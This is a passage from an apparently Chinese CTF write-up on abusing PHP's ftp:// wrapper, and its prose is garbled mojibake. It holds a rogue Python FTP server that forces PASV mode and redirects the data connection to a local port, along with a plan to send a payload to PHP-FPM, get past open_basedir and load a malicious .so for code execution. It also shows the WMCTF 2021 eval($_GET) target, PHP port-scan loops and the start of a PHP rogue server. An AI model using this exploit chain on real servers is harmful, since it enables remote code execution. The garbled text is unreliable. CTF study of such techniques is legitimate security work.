&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>ä½†æ˜¯è¿™é‡Œä¸€ç›´æ˜¯å¯ä»¥æ–°å»ºæ–‡ä»¶ä½†æ˜¯å†™å…¥ä¸äº†ï¼Œè¯»å…¥çš„å‚æ•°2ä¸€ç›´æ˜¯int(0)ï¼Œæš‚æ—¶è¿˜æ²¡è§£å†³é—®é¢˜ï¼ˆä¸è¿‡ç”¨ä¸‹é¢é‚£ä¸ªå†™å…¥å¾ˆæ­£å¸¸â€¦â€¦&lt;/p>
&lt;p>è¦†ç›–å·²å­˜åœ¨æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_write_2.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;newwwwew&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png" alt="image-20211112225832777">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftpå¹¶è½¬å‘ftp-data">ä»¤phpä½¿ç”¨ftp://å¹¶è½¬å‘FTP-DATA&lt;/h4>
&lt;p>å°†ä¸Šé¢çš„æ“ä½œç”¨wiresharkæŠ“ä¸ªåŒ…çœ‹çœ‹æµé‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112230401822.png" alt="image-20211112230401822">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯EPSV modeè€Œä¸æ˜¯PASV modeï¼Œä¸ä¼šæœ‰æ‹¬å·å†…çš„ip+portæè¿°ï¼ŒFTP-DATAåªä¼šè¢«æ‰“å‘æ§åˆ¶è¿æ¥çš„æœåŠ¡ç«¯çš„ç«¯å£ï¼Œä¸èƒ½åšåˆ°FTP-DATAçš„ä»»æ„è½¬å‘&lt;/p>
&lt;p>ä¸è¿‡ä¹Ÿä¸æ˜¯æ¯«æ— åŠæ³•ï¼Œå¦‚æœç”¨EPSVå‘½ä»¤è¿”å›çš„ç»“æœä¸æ˜¯229ï¼Œé‚£ä¹ˆphpçš„ftp://å°±ä¼šä½¿ç”¨PASVå‘½ä»¤&lt;/p>
&lt;p>å°†ä¸Šé¢çš„ftp-serverä¿®æ”¹ä¸€ä¸‹ï¼Œå°†229å“åº”è®¾ä¸ºäº†000&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;550 Could not get file size.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># responese with 000 , not 229&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;000 use PASV then&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># then php will send PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># response to PASV command&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112234038671.png" alt="image-20211112234038671">&lt;/p>
&lt;p>æˆåŠŸè½¬å‘&lt;/p>
&lt;h4 id="ä½¿ç”¨ftpå°†payloadæ‰“å‘fpm">ä½¿ç”¨ftp://å°†payloadæ‰“å‘fpm&lt;/h4>
&lt;p>ç»“åˆä¸Šé¢å‡ ä¸ªå®ä¾‹åº”è¯¥å°±å¾ˆæ¸…æ™°äº†ï¼Œæ€è·¯å°±æ˜¯ï¼š&lt;/p>
&lt;ul>
&lt;li>ç¼–å†™åŒ…å«æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¶æ„.so&lt;/li>
&lt;li>æ‰“å‘fpmçš„ä¸€æ³¢æµé‡ï¼Œç”¨äºè§£å¼€open_basedir, allow_url_includeç­‰çš„é™åˆ¶ï¼Œå½¢å¼æ˜¯file_put_contents(&amp;lsquo;ftp://xxx&amp;rsquo;,$payload)&lt;/li>
&lt;li>ç”¨file_put_contents(&amp;rsquo;/tmp/wuhu.so&amp;rsquo;,$_POST[&amp;lsquo;data&amp;rsquo;])çš„å½¢å¼å°†.soä¼ å…¥&lt;/li>
&lt;li>å¦‚æœé¡ºåˆ©çš„è¯open_basedirè§£å¼€é™åˆ¶ï¼Œ.soè¢«åŒ…å«ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œ.soä¸­çš„ä»£ç åšåˆ°rceäº†&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œçš„å®Œç¾æ —å­å½“ç„¶æ˜¯èµµæ€»çš„ä¸‰å¥è¯ï¼ˆæŒ‡è·¯èµµæ€»åšå®¢-&amp;gt;&lt;a href="https://www.zhaoj.in/read-6951.html">WMCTF2021-Web-Make PHP Great Again And Again WriteUp&lt;/a>&lt;/p>
&lt;h4 id="wmctf-2021make-php-great-again-and-again">[WMCTF 2021]Make PHP Great Again And Again&lt;/h4>
&lt;p>æ€è·¯å…ˆæ”¾åœ¨å‰é¢ï¼šæ‰¾åˆ°fpmç«¯å£-&amp;gt;æ­å»ºæ¶æ„ftp_server å°†.soæ–‡ä»¶è½¬å‘è‡³fpmç«¯å£-&amp;gt;åˆ©ç”¨.soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤-&amp;gt;æ‹¿flag&lt;/p>
&lt;p>é¢˜ç›®ä»£ç åªæœ‰ä¸‰å¥è¯&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;glzjin&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´æ¥çœ‹phpinfo();ä¼š500ï¼Œç”¨&lt;code>get_cfg_var&lt;/code>è·å–é…ç½®é¡¹&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27disable_functions%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(657) &amp;#34;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive&amp;#34;
&lt;/code>&lt;/pre>&lt;p>åªèƒ½è¯´è¯¥ç¦çš„éƒ½ç¦äº†ï¼›å†åº·åº·allow_url_fopenå’Œinclude&lt;/p>
&lt;pre tabindex="0">&lt;code>string(1) &amp;#34;1&amp;#34;
string(0) &amp;#34;&amp;#34;
&lt;/code>&lt;/pre>&lt;p>å†åº·åº·open_basedir&lt;/p>
&lt;pre tabindex="0">&lt;code>/?glzjin=var_dump(get_cfg_var(%27open_basedir%27));
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>string(14) &amp;#34;/var/www/html/&amp;#34;
&lt;/code>&lt;/pre>&lt;p>emmmmmmmmm è¿™ä¸ªä¹‹åä¹Ÿéœ€è¦ç»•è¿‡&lt;/p>
&lt;p>ç”¨tcp://ä¼ªåè®®æ‰«ä¸€ä¸‹æœ¬æœºå¼€æ”¾çš„ç«¯å£&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$ee2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ee2&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;Address already in use&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…&lt;code>file_get_contents&lt;/code>å’Œ&lt;code>error_get_last&lt;/code>è·å–åˆ°è¯·æ±‚ä¸­å‘å‡ºçš„é”™è¯¯è¿›è¡Œå¾ªç¯åˆ¤æ–­ä¹Ÿå¯ä»¥è¿›è¡Œç«¯å£æ‰«æ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$t&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">strpos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error_get_last&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#d88200">&amp;#39;message&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;Connection refused&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>int(11451) int(37114) int(48748)
&lt;/code>&lt;/pre>&lt;p>æ‰¾åˆ°äº†fpmç«¯å£11451&lt;/p>
&lt;p>ä¹‹åå°±ç»­ä¸Šäº†æˆ‘ä»¬å‰é¢çš„æ€è·¯ï¼Œå…ˆåœ¨æœ¬åœ°ï¼ˆä¹Ÿå°±æ˜¯é¶æœºçš„æœ¬åœ°ï¼‰èµ·ä¸€ä¸ªæ¶æ„çš„ftp_serveræœåŠ¡ç”¨æ¥è½¬å‘FTP-DATAï¼ˆå³.soæ–‡ä»¶ï¼‰è‡³fpmç«¯å£ï¼ˆ11451ï¼‰ï¼›è¿™é‡Œçš„expæ˜¯phpç‰ˆçš„ï¼ŒåŸç†è·Ÿä¸Šé¢çš„pyç‰ˆæ˜¯ä¸€æ ·çš„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$socket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_socket_server&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tcp://0.0.0.0:46819&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errno&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$errstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
